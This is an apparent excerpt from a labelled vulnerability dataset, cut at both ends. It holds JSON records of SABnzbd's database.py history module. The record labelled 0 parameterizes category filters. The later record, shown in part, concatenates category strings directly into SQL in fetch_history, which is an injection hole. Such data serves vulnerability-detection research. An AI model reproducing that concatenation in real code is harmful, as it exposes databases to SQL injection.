cascade=True)\n\n    package_tag_index = sqlobject.DatabaseIndex('package', 'tag',\n            unique=True)\n\n/n/n/n", "label": 1}, {"id": "ad9fef5f416ef31eb3fdf7c1774434092fd6a52c", "code": "sabnzbd/database.py/n/n#!/usr/bin/python -OO\n# Copyright 2008-2017 The SABnzbd-Team <team@sabnzbd.org>\n#\n# This program is free software; you can redistribute it and/or\n# modify it under the terms of the GNU General Public License\n# as published by the Free Software Foundation; either version 2\n# of the License, or (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.\n\n\"\"\"\nsabnzbd.database - Database Support\n\"\"\"\n\ntry:\n    import sqlite3\nexcept:\n    try:\n        import pysqlite2.dbapi2 as sqlite3\n    except:\n        pass\n\nimport os\nimport time\nimport zlib\nimport logging\nimport sys\nimport threading\n\nimport sabnzbd\nimport sabnzbd.cfg\nfrom sabnzbd.constants import DB_HISTORY_NAME, STAGES\nfrom sabnzbd.encoding import unicoder\nfrom sabnzbd.bpsmeter import this_week, this_month\nfrom sabnzbd.decorators import synchronized\nfrom sabnzbd.misc import get_all_passwords, int_conv\n\nDB_LOCK = threading.RLock()\n\n\ndef convert_search(search):\n    \"\"\" Convert classic wildcard to SQL wildcard \"\"\"\n    if not search:\n        # Default value\n        search = ''\n    else:\n        # Allow * for wildcard matching and space\n        search = search.replace('*', '%').replace(' ', '%')\n\n    # Allow ^ for start of string and $ for end of string\n    if search and search.startswith('^'):\n        search = search.replace('^', '')\n        search += '%'\n    elif search and search.endswith('$'):\n        search = search.replace('$', '')\n        search = '%' + search\n    else:\n        search = '%' + search + '%'\n    return search\n\n\nclass HistoryDB(object):\n    \"\"\" Class to access the History database\n        Each class-instance will create an access channel that\n        can be used in one thread.\n        Each thread needs its own class-instance!\n    \"\"\"\n    # These class attributes will be accessed directly because\n    # they need to be shared by all instances\n    db_path = None        # Will contain full path to history database\n    done_cleaning = False # Ensure we only do one Vacuum per session\n\n    @synchronized(DB_LOCK)\n    def __init__(self):\n        \"\"\" Determine databse path and create connection \"\"\"\n        self.con = self.c = None\n        if not HistoryDB.db_path:\n            HistoryDB.db_path = os.path.join(sabnzbd.cfg.admin_dir.get_path(), DB_HISTORY_NAME)\n        self.connect()\n\n\n    def connect(self):\n        \"\"\" Create a connection to the database \"\"\"\n        create_table = not os.path.exists(HistoryDB.db_path)\n        self.con = sqlite3.connect(HistoryDB.db_path)\n        self.con.row_factory = dict_factory\n        self.c = self.con.cursor()\n        if create_table:\n            self.create_history_db()\n        elif not HistoryDB.done_cleaning:\n            # Run VACUUM on sqlite\n            # When an object (table, index, or trigger) is dropped from the database, it leaves behind empty space\n            # http://www.sqlite.org/lang_vacuum.html\n            HistoryDB.done_cleaning = True\n            self.execute('VACUUM')\n\n        self.execute('PRAGMA user_version;')\n        try:\n            version = self.c.fetchone()['user_version']\n        except TypeError:\n            version = 0\n        if version < 1:\n            # Add any missing columns added since first DB version\n            # Use \"and\" to stop when database has been reset due to corruption\n            _ = self.execute('PRAGMA user_version = 1;') and \\\n                self.execute('ALTER TABLE \"history\" ADD COLUMN series TEXT;') and \\\n                self.execute('ALTER TABLE \"history\" ADD COLUMN md5sum TEXT;')\n        if version < 2:\n            # Add any missing columns added since second DB version\n            # Use \"and\" to stop when database has been reset due to corruption\n            _ = self.execute('PRAGMA user_version = 2;') and \\\n                self.execute('ALTER TABLE \"history\" ADD COLUMN password TEXT;')\n\n\n    def execute(self, command, args=(), save=False):\n        ''' Wrapper for executing SQL commands '''\n        for tries in xrange(5, 0, -1):\n            try:\n                if args and isinstance(args, tuple):\n                    self.c.execute(command, args)\n                else:\n                    self.c.execute(command)\n                if save:\n                    self.save()\n                return True\n            except:\n                error = str(sys.exc_value)\n                if tries >= 0 and 'is locked' in error:\n                    logging.debug('Database locked, wait and retry')\n                    time.sleep(0.5)\n                    continue\n                elif 'readonly' in error:\n                    logging.error(T('Cannot write to History database, check access rights!'))\n                    # Report back success, because there's no recovery possible\n                    return True\n                elif 'not a database' in error or 'malformed' in error or 'duplicate column name' in error:\n                    logging.error(T('Damaged History database, created empty replacement'))\n                    logging.info(\"Traceback: \", exc_info=True)\n                    self.close()\n                    try:\n                        os.remove(HistoryDB.db_path)\n                    except:\n                        pass\n                    self.connect()\n                    # Return False in case of \"duplicate column\" error\n                    # because the column addition in connect() must be terminated\n                    return 'duplicate column name' not in error\n                else:\n                    logging.error(T('SQL Command Failed, see log'))\n                    logging.info(\"SQL: %s\", command)\n                    logging.info(\"Arguments: %s\", repr(args))\n                    logging.info(\"Traceback: \", exc_info=True)\n                    try:\n                        self.con.rollback()\n                    except:\n                        logging.debug(\"Rollback Failed:\", exc_info=True)\n            return False\n\n    def create_history_db(self):\n        \"\"\" Create a new (empty) database file \"\"\"\n        self.execute(\"\"\"\n        CREATE TABLE \"history\" (\n            \"id\" INTEGER PRIMARY KEY,\n            \"completed\" INTEGER NOT NULL,\n            \"name\" TEXT NOT NULL,\n            \"nzb_name\" TEXT NOT NULL,\n            \"category\" TEXT,\n            \"pp\" TEXT,\n            \"script\" TEXT,\n            \"report\" TEXT,\n            \"url\" TEXT,\n            \"status\" TEXT,\n            \"nzo_id\" TEXT,\n            \"storage\" TEXT,\n            \"path\" TEXT,\n            \"script_log\" BLOB,\n            \"script_line\" TEXT,\n            \"download_time\" INTEGER,\n            \"postproc_time\" INTEGER,\n            \"stage_log\" TEXT,\n            \"downloaded\" INTEGER,\n            \"completeness\" INTEGER,\n            \"fail_message\" TEXT,\n            \"url_info\" TEXT,\n            \"bytes\" INTEGER,\n            \"meta\" TEXT,\n            \"series\" TEXT,\n            \"md5sum\" TEXT,\n            \"password\" TEXT\n        )\n        \"\"\")\n        self.execute('PRAGMA user_version = 2;')\n\n    def save(self):\n        \"\"\" Save database to disk \"\"\"\n        try:\n            self.con.commit()\n        except:\n            logging.error(T('SQL Commit Failed, see log'))\n            logging.info(\"Traceback: \", exc_info=True)\n\n    def close(self):\n        \"\"\" Close database connection \"\"\"\n        try:\n            self.c.close()\n            self.con.close()\n        except:\n            logging.error(T('Failed to close database, see log'))\n            logging.info(\"Traceback: \", exc_info=True)\n\n    def remove_completed(self, search=None):\n        \"\"\" Remove all completed jobs from the database, optional with `search` pattern \"\"\"\n        search = convert_search(search)\n        logging.info('Removing all completed jobs from history')\n        return self.execute(\"\"\"DELETE FROM history WHERE name LIKE ? AND status = 'Completed'\"\"\", (search,), save=True)\n\n    def get_failed_paths(self, search=None):\n        \"\"\" Return list of all storage paths of failed jobs (may contain non-existing or empty paths) \"\"\"\n        search = convert_search(search)\n        fetch_ok = self.execute(\"\"\"SELECT path FROM history WHERE name LIKE ? AND status = 'Failed'\"\"\", (search,))\n        if fetch_ok:\n            return [item.get('path') for item in self.c.fetchall()]\n        else:\n            return []\n\n    def remove_failed(self, search=None):\n        \"\"\" Remove all failed jobs from the database, optional with `search` pattern \"\"\"\n        search = convert_search(search)\n        logging.info('Removing all failed jobs from history')\n        return self.execute(\"\"\"DELETE FROM history WHERE name LIKE ? AND status = 'Failed'\"\"\", (search,), save=True)\n\n    def remove_history(self, jobs=None):\n        \"\"\" Remove all jobs in the list `jobs`, empty list will remove all completed jobs \"\"\"\n        if jobs is None:\n            self.remove_completed()\n        else:\n            if not isinstance(jobs, list):\n                jobs = [jobs]\n\n            for job in jobs:\n                self.execute(\"\"\"DELETE FROM history WHERE nzo_id=?\"\"\", (job,))\n                logging.info('Removing job %s from history', job)\n\n        self.save()\n\n    def auto_history_purge(self):\n        \"\"\" Remove history items based on the configured history-retention \"\"\"\n        if sabnzbd.cfg.history_retention() == \"0\":\n            return\n\n        if sabnzbd.cfg.history_retention() == \"-1\":\n            # Delete all non-failed ones\n            self.remove_completed()\n\n        if \"d\" in sabnzbd.cfg.history_retention():\n            # How many days to keep?\n            days_to_keep = int_conv(sabnzbd.cfg.history_retention().strip()[:-1])\n            seconds_to_keep = int(time.time()) - days_to_keep*3600*24\n            if days_to_keep > 0:\n                logging.info('Removing completed jobs older than %s days from history', days_to_keep)\n                return self.execute(\"\"\"DELETE FROM history WHERE status = 'Completed' AND completed < ?\"\"\", (seconds_to_keep,), save=True)\n        else:\n            # How many to keep?\n            to_keep = int_conv(sabnzbd.cfg.history_retention())\n            if to_keep > 0:\n                logging.info('Removing all but last %s completed jobs from history', to_keep)\n                return self.execute(\"\"\"DELETE FROM history WHERE id NOT IN ( SELECT id FROM history WHERE status = 'Completed' ORDER BY completed DESC LIMIT ? )\"\"\", (to_keep,), save=True)\n\n\n    def add_history_db(self, nzo, storage, path, postproc_time, script_output, script_line):\n        \"\"\" Add a new job entry to the database \"\"\"\n        t = build_history_info(nzo, storage, path, postproc_time, script_output, script_line)\n\n        if self.execute(\"\"\"INSERT INTO history (completed, name, nzb_name, category, pp, script, report,\n        url, status, nzo_id, storage, path, script_log, script_line, download_time, postproc_time, stage_log,\n        downloaded, completeness, fail_message, url_info, bytes, series, md5sum, password)\n        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)\"\"\", t):\n            self.save()\n        logging.info('Added job %s to history', nzo.final_name)\n\n    def fetch_history(self, start=None, limit=None, search=None, failed_only=0, categories=None):\n        \"\"\" Return records for specified jobs \"\"\"\n        command_args = [convert_search(search)]\n\n        post = ''\n        if categories:\n            categories = ['*' if c == 'Default' else c for c in categories]\n            post = \" AND (CATEGORY = ?\"\n            post += \" OR CATEGORY = ? \" * (len(categories)-1)\n            post += \")\"\n            command_args.extend(categories)\n        if failed_only:\n            post += ' AND STATUS = \"Failed\"'\n\n        cmd = 'SELECT COUNT(*) FROM history WHERE name LIKE ?'\n        res = self.execute(cmd + post, tuple(command_args))\n        total_items = -1\n        if res:\n            try:\n                total_items = self.c.fetchone().get('COUNT(*)')\n            except AttributeError:\n                pass\n\n        if not start:\n            start = 0\n        if not limit:\n            limit = total_items\n\n        command_args.extend([start, limit])\n        cmd = 'SELECT * FROM history WHERE name LIKE ?'\n        fetch_ok = self.execute(cmd + post + ' ORDER BY completed desc LIMIT ?, ?', tuple(command_args))\n\n        if fetch_ok:\n            items = self.c.fetchall()\n        else:\n            items = []\n\n        fetched_items = len(items)\n\n        # Unpack the single line stage log\n        # Stage Name is separated by ::: stage lines by ; and stages by \\r\\n\n        items = [unpack_history_info(item) for item in items]\n\n        return (items, fetched_items, total_items)\n\n    def have_episode(self, series, season, episode):\n        \"\"\" Check whether History contains this series episode \"\"\"\n        total = 0\n        series = series.lower().replace('.', ' ').replace('_', ' ').replace('  ', ' ')\n        if series and season and episode:\n            pattern = '%s/%s/%s' % (series, season, episode)\n            res = self.execute(\"select count(*) from History WHERE series = ? AND STATUS != 'Failed'\", (pattern,))\n            if res:\n                try:\n                    total = self.c.fetchone().get('count(*)')\n                except AttributeError:\n                    pass\n        return total > 0\n\n    def have_md5sum(self, md5sum):\n        \"\"\" Check whether this md5sum already in History \"\"\"\n        total = 0\n        res = self.execute(\"select count(*) from History WHERE md5sum = ? AND STATUS != 'Failed'\", (md5sum,))\n        if res:\n            try:\n                total = self.c.fetchone().get('count(*)')\n            except AttributeError:\n                pass\n        return total > 0\n\n    def get_history_size(self):\n        \"\"\" Returns the total size of the history and\n            amounts downloaded in the last month and week\n        \"\"\"\n        # Total Size of the history\n        total = 0\n        if self.execute('''SELECT sum(bytes) FROM history'''):\n            try:\n                total = self.c.fetchone().get('sum(bytes)')\n            except AttributeError:\n                pass\n\n        # Amount downloaded this month\n        # r = time.gmtime(time.time())\n        # month_timest = int(time.mktime((r.tm_year, r.tm_mon, 0, 0, 0, 1, r.tm_wday, r.tm_yday, r.tm_isdst)))\n        month_timest = int(this_month(time.time()))\n\n        month = 0\n        if self.execute('''SELECT sum(bytes) FROM history WHERE \"completed\">?''', (month_timest,)):\n            try:\n                month = self.c.fetchone().get('sum(bytes)')\n            except AttributeError:\n                pass\n\n        # Amount downloaded this week\n        week_timest = int(this_week(time.time()))\n\n        week = 0\n        if self.execute('''SELECT sum(bytes) FROM history WHERE \"completed\">?''', (week_timest,)):\n            try:\n                week = self.c.fetchone().get('sum(bytes)')\n            except AttributeError:\n                pass\n\n        return (total, month, week)\n\n    def get_script_log(self, nzo_id):\n        \"\"\" Return decompressed log file \"\"\"\n        data = ''\n        t = (nzo_id,)\n        if self.execute('SELECT script_log FROM history WHERE nzo_id=?', t):\n            try:\n                data = zlib.decompress(self.c.fetchone().get('script_log'))\n            except:\n                pass\n        return data\n\n    def get_name(self, nzo_id):\n        \"\"\" Return name of the job `nzo_id` \"\"\"\n        t = (nzo_id,)\n        name = ''\n        if self.execute('SELECT name FROM history WHERE nzo_id=?', t):\n            try:\n                name = self.c.fetchone().get('name')\n            except AttributeError:\n                pass\n        return name\n\n    def get_path(self, nzo_id):\n        \"\"\" Return the `incomplete` path of the job `nzo_id` \"\"\"\n        t = (nzo_id,)\n        path = ''\n        if self.execute('SELECT path FROM history WHERE nzo_id=?', t):\n            try:\n                path = self.c.fetchone().get('path')\n            except AttributeError:\n                pass\n        return path\n\n    def get_other(self, nzo_id):\n        \"\"\" Return additional data for job `nzo_id` \"\"\"\n        t = (nzo_id,)\n        if self.execute('SELECT * FROM history WHERE nzo_id=?', t):\n            try:\n                items = self.c.fetchall()[0]\n                dtype = items.get('report')\n                url = items.get('url')\n                pp = items.get('pp')\n                script = items.get('script')\n                cat = items.get('category')\n            except (AttributeError, IndexError):\n                return '', '', '', '', ''\n        return dtype, url, pp, script, cat\n\n\ndef dict_factory(cursor, row):\n    \"\"\" Return a dictionary for the current database position \"\"\"\n    d = {}\n    for idx, col in enumerate(cursor.description):\n        d[col[0]] = row[idx]\n    return d\n\n\n_PP_LOOKUP = {0: '', 1: 'R', 2: 'U', 3: 'D'}\ndef build_history_info(nzo, storage='', downpath='', postproc_time=0, script_output='', script_line=''):\n    \"\"\" Collects all the information needed for the database \"\"\"\n\n    if not downpath:\n        downpath = nzo.downpath\n    path = decode_factory(downpath)\n    storage = decode_factory(storage)\n    script_line = decode_factory(script_line)\n\n    flagRepair, flagUnpack, flagDelete = nzo.repair_opts\n    nzo_info = decode_factory(nzo.nzo_info)\n\n    url = decode_factory(nzo.url)\n\n    completed = int(time.time())\n    name = decode_factory(nzo.final_name)\n\n    nzb_name = decode_factory(nzo.filename)\n    category = decode_factory(nzo.cat)\n    pp = _PP_LOOKUP.get(sabnzbd.opts_to_pp(flagRepair, flagUnpack, flagDelete), 'X')\n    script = decode_factory(nzo.script)\n    status = decode_factory(nzo.status)\n    nzo_id = nzo.nzo_id\n    bytes = nzo.bytes_downloaded\n\n    if script_output:\n        # Compress the output of the script\n        script_log = sqlite3.Binary(zlib.compress(script_output))\n        #\n    else:\n        script_log = ''\n\n    download_time = decode_factory(nzo_info.get('download_time', 0))\n\n    downloaded = nzo.bytes_downloaded\n    completeness = 0\n    fail_message = decode_factory(nzo.fail_msg)\n    url_info = nzo_info.get('details', '') or nzo_info.get('more_info', '')\n\n    # Get the dictionary containing the stages and their unpack process\n    stages = decode_factory(nzo.unpack_info)\n    # Pack the dictionary up into a single string\n    # Stage Name is separated by ::: stage lines by ; and stages by \\r\\n\n    lines = []\n    for key, results in stages.iteritems():\n        lines.append('%s:::%s' % (key, ';'.join(results)))\n    stage_log = '\\r\\n'.join(lines)\n\n    # Reuse the old 'report' column to indicate a URL-fetch\n    report = 'future' if nzo.futuretype else ''\n\n    # Analyze series info only when job is finished\n    series = u''\n    if postproc_time:\n        seriesname, season, episode, dummy = sabnzbd.newsunpack.analyse_show(nzo.final_name)\n        if seriesname and season and episode:\n            series = u'%s/%s/%s' % (seriesname.lower(), season, episode)\n\n    # See whatever the first password was, for the Retry\n    password = ''\n    passwords = get_all_passwords(nzo)\n    if passwords:\n        password = passwords[0]\n\n    return (completed, name, nzb_name, category, pp, script, report, url, status, nzo_id, storage, path,\n            script_log, script_line, download_time, postproc_time, stage_log, downloaded, completeness,\n            fail_message, url_info, bytes, series, nzo.md5sum, password)\n\n\n\ndef unpack_history_info(item):\n    \"\"\" Expands the single line stage_log from the DB\n        into a python dictionary for use in the history display\n    \"\"\"\n    # Stage Name is separated by ::: stage lines by ; and stages by \\r\\n\n    lst = item['stage_log']\n    if lst:\n        try:\n            lines = lst.split('\\r\\n')\n        except:\n            logging.error(T('Invalid stage logging in history for %s') + ' (\\\\r\\\\n)', unicoder(item['name']))\n            logging.debug('Lines: %s', lst)\n            lines = []\n        lst = [None for x in STAGES]\n        for line in lines:\n            stage = {}\n            try:\n                key, logs = line.split(':::')\n            except:\n                logging.debug('Missing key:::logs \"%s\"', line)\n                key = line\n                logs = ''\n            stage['name'] = key\n            stage['actions'] = []\n            try:\n                logs = logs.split(';')\n            except:\n                logging.error(T('Invalid stage logging in history for %s') + ' (;)', unicoder(item['name']))\n                logging.debug('Logs: %s', logs)\n                logs = []\n            for log in logs:\n                stage['actions'].append(log)\n            try:\n                lst[STAGES[key]] = stage\n            except KeyError:\n                lst.append(stage)\n        # Remove unused stages\n        item['stage_log'] = [x for x in lst if x is not None]\n\n    if item['script_log']:\n        item['script_log'] = ''\n    # The action line is only available for items in the postproc queue\n    if 'action_line' not in item:\n        item['action_line'] = ''\n    return item\n\n\ndef midnight_history_purge():\n    logging.info('Scheduled history purge')\n    history_db = HistoryDB()\n    history_db.auto_history_purge()\n    history_db.close()\n\n\ndef decode_factory(text):\n    \"\"\" Recursively looks through the supplied argument\n        and converts and text to Unicode\n    \"\"\"\n    if isinstance(text, str):\n        return unicoder(text)\n\n    elif isinstance(text, list):\n        new_text = []\n        for t in text:\n            new_text.append(decode_factory(t))\n        return new_text\n\n    elif isinstance(text, dict):\n        new_text = {}\n        for key in text:\n            new_text[key] = decode_factory(text[key])\n        return new_text\n    else:\n        return text\n/n/n/n", "label": 0}, {"id": "ad9fef5f416ef31eb3fdf7c1774434092fd6a52c", "code": "/sabnzbd/database.py/n/n#!/usr/bin/python -OO\n# Copyright 2008-2017 The SABnzbd-Team <team@sabnzbd.org>\n#\n# This program is free software; you can redistribute it and/or\n# modify it under the terms of the GNU General Public License\n# as published by the Free Software Foundation; either version 2\n# of the License, or (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.\n\n\"\"\"\nsabnzbd.database - Database Support\n\"\"\"\n\ntry:\n    import sqlite3\nexcept:\n    try:\n        import pysqlite2.dbapi2 as sqlite3\n    except:\n        pass\n\nimport os\nimport time\nimport zlib\nimport logging\nimport sys\nimport threading\n\nimport sabnzbd\nimport sabnzbd.cfg\nfrom sabnzbd.constants import DB_HISTORY_NAME, STAGES\nfrom sabnzbd.encoding import unicoder\nfrom sabnzbd.bpsmeter import this_week, this_month\nfrom sabnzbd.decorators import synchronized\nfrom sabnzbd.misc import get_all_passwords, int_conv\n\nDB_LOCK = threading.RLock()\n\n\ndef convert_search(search):\n    \"\"\" Convert classic wildcard to SQL wildcard \"\"\"\n    if not search:\n        # Default value\n        search = ''\n    else:\n        # Allow * for wildcard matching and space\n        search = search.replace('*', '%').replace(' ', '%')\n\n    # Allow ^ for start of string and $ for end of string\n    if search and search.startswith('^'):\n        search = search.replace('^', '')\n        search += '%'\n    elif search and search.endswith('$'):\n        search = search.replace('$', '')\n        search = '%' + search\n    else:\n        search = '%' + search + '%'\n    return search\n\n\nclass HistoryDB(object):\n    \"\"\" Class to access the History database\n        Each class-instance will create an access channel that\n        can be used in one thread.\n        Each thread needs its own class-instance!\n    \"\"\"\n    # These class attributes will be accessed directly because\n    # they need to be shared by all instances\n    db_path = None        # Will contain full path to history database\n    done_cleaning = False # Ensure we only do one Vacuum per session\n\n    @synchronized(DB_LOCK)\n    def __init__(self):\n        \"\"\" Determine databse path and create connection \"\"\"\n        self.con = self.c = None\n        if not HistoryDB.db_path:\n            HistoryDB.db_path = os.path.join(sabnzbd.cfg.admin_dir.get_path(), DB_HISTORY_NAME)\n        self.connect()\n\n\n    def connect(self):\n        \"\"\" Create a connection to the database \"\"\"\n        create_table = not os.path.exists(HistoryDB.db_path)\n        self.con = sqlite3.connect(HistoryDB.db_path)\n        self.con.row_factory = dict_factory\n        self.c = self.con.cursor()\n        if create_table:\n            self.create_history_db()\n        elif not HistoryDB.done_cleaning:\n            # Run VACUUM on sqlite\n            # When an object (table, index, or trigger) is dropped from the database, it leaves behind empty space\n            # http://www.sqlite.org/lang_vacuum.html\n            HistoryDB.done_cleaning = True\n            self.execute('VACUUM')\n\n        self.execute('PRAGMA user_version;')\n        try:\n            version = self.c.fetchone()['user_version']\n        except TypeError:\n            version = 0\n        if version < 1:\n            # Add any missing columns added since first DB version\n            # Use \"and\" to stop when database has been reset due to corruption\n            _ = self.execute('PRAGMA user_version = 1;') and \\\n                self.execute('ALTER TABLE \"history\" ADD COLUMN series TEXT;') and \\\n                self.execute('ALTER TABLE \"history\" ADD COLUMN md5sum TEXT;')\n        if version < 2:\n            # Add any missing columns added since second DB version\n            # Use \"and\" to stop when database has been reset due to corruption\n            _ = self.execute('PRAGMA user_version = 2;') and \\\n                self.execute('ALTER TABLE \"history\" ADD COLUMN password TEXT;')\n\n\n    def execute(self, command, args=(), save=False):\n        ''' Wrapper for executing SQL commands '''\n        for tries in xrange(5, 0, -1):\n            try:\n                if args and isinstance(args, tuple):\n                    self.c.execute(command, args)\n                else:\n                    self.c.execute(command)\n                if save:\n                    self.save()\n                return True\n            except:\n                error = str(sys.exc_value)\n                if tries >= 0 and 'is locked' in error:\n                    logging.debug('Database locked, wait and retry')\n                    time.sleep(0.5)\n                    continue\n                elif 'readonly' in error:\n                    logging.error(T('Cannot write to History database, check access rights!'))\n                    # Report back success, because there's no recovery possible\n                    return True\n                elif 'not a database' in error or 'malformed' in error or 'duplicate column name' in error:\n                    logging.error(T('Damaged History database, created empty replacement'))\n                    logging.info(\"Traceback: \", exc_info=True)\n                    self.close()\n                    try:\n                        os.remove(HistoryDB.db_path)\n                    except:\n                        pass\n                    self.connect()\n                    # Return False in case of \"duplicate column\" error\n                    # because the column addition in connect() must be terminated\n                    return 'duplicate column name' not in error\n                else:\n                    logging.error(T('SQL Command Failed, see log'))\n                    logging.debug(\"SQL: %s\", command)\n                    logging.info(\"Traceback: \", exc_info=True)\n                    try:\n                        self.con.rollback()\n                    except:\n                        logging.debug(\"Rollback Failed:\", exc_info=True)\n            return False\n\n    def create_history_db(self):\n        \"\"\" Create a new (empty) database file \"\"\"\n        self.execute(\"\"\"\n        CREATE TABLE \"history\" (\n            \"id\" INTEGER PRIMARY KEY,\n            \"completed\" INTEGER NOT NULL,\n            \"name\" TEXT NOT NULL,\n            \"nzb_name\" TEXT NOT NULL,\n            \"category\" TEXT,\n            \"pp\" TEXT,\n            \"script\" TEXT,\n            \"report\" TEXT,\n            \"url\" TEXT,\n            \"status\" TEXT,\n            \"nzo_id\" TEXT,\n            \"storage\" TEXT,\n            \"path\" TEXT,\n            \"script_log\" BLOB,\n            \"script_line\" TEXT,\n            \"download_time\" INTEGER,\n            \"postproc_time\" INTEGER,\n            \"stage_log\" TEXT,\n            \"downloaded\" INTEGER,\n            \"completeness\" INTEGER,\n            \"fail_message\" TEXT,\n            \"url_info\" TEXT,\n            \"bytes\" INTEGER,\n            \"meta\" TEXT,\n            \"series\" TEXT,\n            \"md5sum\" TEXT,\n            \"password\" TEXT\n        )\n        \"\"\")\n        self.execute('PRAGMA user_version = 2;')\n\n    def save(self):\n        \"\"\" Save database to disk \"\"\"\n        try:\n            self.con.commit()\n        except:\n            logging.error(T('SQL Commit Failed, see log'))\n            logging.info(\"Traceback: \", exc_info=True)\n\n    def close(self):\n        \"\"\" Close database connection \"\"\"\n        try:\n            self.c.close()\n            self.con.close()\n        except:\n            logging.error(T('Failed to close database, see log'))\n            logging.info(\"Traceback: \", exc_info=True)\n\n    def remove_completed(self, search=None):\n        \"\"\" Remove all completed jobs from the database, optional with `search` pattern \"\"\"\n        search = convert_search(search)\n        logging.info('Removing all completed jobs from history')\n        return self.execute(\"\"\"DELETE FROM history WHERE name LIKE ? AND status = 'Completed'\"\"\", (search,), save=True)\n\n    def get_failed_paths(self, search=None):\n        \"\"\" Return list of all storage paths of failed jobs (may contain non-existing or empty paths) \"\"\"\n        search = convert_search(search)\n        fetch_ok = self.execute(\"\"\"SELECT path FROM history WHERE name LIKE ? AND status = 'Failed'\"\"\", (search,))\n        if fetch_ok:\n            return [item.get('path') for item in self.c.fetchall()]\n        else:\n            return []\n\n    def remove_failed(self, search=None):\n        \"\"\" Remove all failed jobs from the database, optional with `search` pattern \"\"\"\n        search = convert_search(search)\n        logging.info('Removing all failed jobs from history')\n        return self.execute(\"\"\"DELETE FROM history WHERE name LIKE ? AND status = 'Failed'\"\"\", (search,), save=True)\n\n    def remove_history(self, jobs=None):\n        \"\"\" Remove all jobs in the list `jobs`, empty list will remove all completed jobs \"\"\"\n        if jobs is None:\n            self.remove_completed()\n        else:\n            if not isinstance(jobs, list):\n                jobs = [jobs]\n\n            for job in jobs:\n                self.execute(\"\"\"DELETE FROM history WHERE nzo_id=?\"\"\", (job,))\n                logging.info('Removing job %s from history', job)\n\n        self.save()\n\n    def auto_history_purge(self):\n        \"\"\" Remove history items based on the configured history-retention \"\"\"\n        if sabnzbd.cfg.history_retention() == \"0\":\n            return\n\n        if sabnzbd.cfg.history_retention() == \"-1\":\n            # Delete all non-failed ones\n            self.remove_completed()\n\n        if \"d\" in sabnzbd.cfg.history_retention():\n            # How many days to keep?\n            days_to_keep = int_conv(sabnzbd.cfg.history_retention().strip()[:-1])\n            seconds_to_keep = int(time.time()) - days_to_keep*3600*24\n            if days_to_keep > 0:\n                logging.info('Removing completed jobs older than %s days from history', days_to_keep)\n                return self.execute(\"\"\"DELETE FROM history WHERE status = 'Completed' AND completed < ?\"\"\", (seconds_to_keep,), save=True)\n        else:\n            # How many to keep?\n            to_keep = int_conv(sabnzbd.cfg.history_retention())\n            if to_keep > 0:\n                logging.info('Removing all but last %s completed jobs from history', to_keep)\n                return self.execute(\"\"\"DELETE FROM history WHERE id NOT IN ( SELECT id FROM history WHERE status = 'Completed' ORDER BY completed DESC LIMIT ? )\"\"\", (to_keep,), save=True)\n\n\n    def add_history_db(self, nzo, storage, path, postproc_time, script_output, script_line):\n        \"\"\" Add a new job entry to the database \"\"\"\n        t = build_history_info(nzo, storage, path, postproc_time, script_output, script_line)\n\n        if self.execute(\"\"\"INSERT INTO history (completed, name, nzb_name, category, pp, script, report,\n        url, status, nzo_id, storage, path, script_log, script_line, download_time, postproc_time, stage_log,\n        downloaded, completeness, fail_message, url_info, bytes, series, md5sum, password)\n        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)\"\"\", t):\n            self.save()\n        logging.info('Added job %s to history', nzo.final_name)\n\n    def fetch_history(self, start=None, limit=None, search=None, failed_only=0, categories=None):\n        \"\"\" Return records for specified jobs \"\"\"\n        search = convert_search(search)\n\n        post = ''\n        if categories:\n            categories = ['*' if c == 'Default' else c for c in categories]\n            post = \" AND (CATEGORY = '\"\n            post += \"' OR CATEGORY = '\".join(categories)\n            post += \"' )\"\n        if failed_only:\n            post += ' AND STATUS = \"Failed\"'\n\n        cmd = 'SELECT COUNT(*) FROM history WHERE name LIKE ?'\n        res = self.execute(cmd + post, (search,))\n        total_items = -1\n        if res:\n            try:\n                total_items = self.c.fetchone().get('COUNT(*)')\n            except AttributeError:\n                pass\n\n        if not start:\n            start = 0\n        if not limit:\n            limit = total_items\n\n        t = (search, start, limit)\n        cmd = 'SELECT * FROM history WHERE name LIKE ?'\n        fetch_ok = self.execute(cmd + post + ' ORDER BY completed desc LIMIT ?, ?', t)\n\n        if fetch_ok:\n            items = self.c.fetchall()\n        else:\n            items = []\n\n        fetched_items = len(items)\n\n        # Unpack the single line stage log\n        # Stage Name is separated by ::: stage lines by ; and stages by \\r\\n\n        items = [unpack_history_info(item) for item in items]\n\n        return (items, fetched_items, total_items)\n\n    def have_episode(self, series, season, episode):\n        \"\"\" Check whether History contains this series episode \"\"\"\n        total = 0\n        series = series.lower().replace('.', ' ').replace('_', ' ').replace('  ', ' ')\n        if series and season and episode:\n            pattern = '%s/%s/%s' % (series, season, episode)\n            res = self.execute(\"select count(*) from History WHERE series = ? AND STATUS != 'Failed'\", (pattern,))\n            if res:\n                try:\n                    total = self.c.fetchone().get('count(*)')\n                except AttributeError:\n                    pass\n        return total > 0\n\n    def have_md5sum(self, md5sum):\n        \"\"\" Check whether this md5sum already in History \"\"\"\n        total = 0\n        res = self.execute(\"select count(*) from History WHERE md5sum = ? AND STATUS != 'Failed'\", (md5sum,))\n        if res:\n            try:\n                total = self.c.fetchone().get('count(*)')\n            except AttributeError:\n                pass\n        return total > 0\n\n    def get_history_size(self):\n        \"\"\" Returns the total size of the history and\n            amounts downloaded in the last month and week\n        \"\"\"\n        # Total Size of the history\n        total = 0\n        if self.execute('''SELECT sum(bytes) FROM history'''):\n            try:\n                total = self.c.fetchone().get('sum(bytes)')\n            except AttributeError:\n                pass\n\n        # Amount downloaded this month\n        # r = 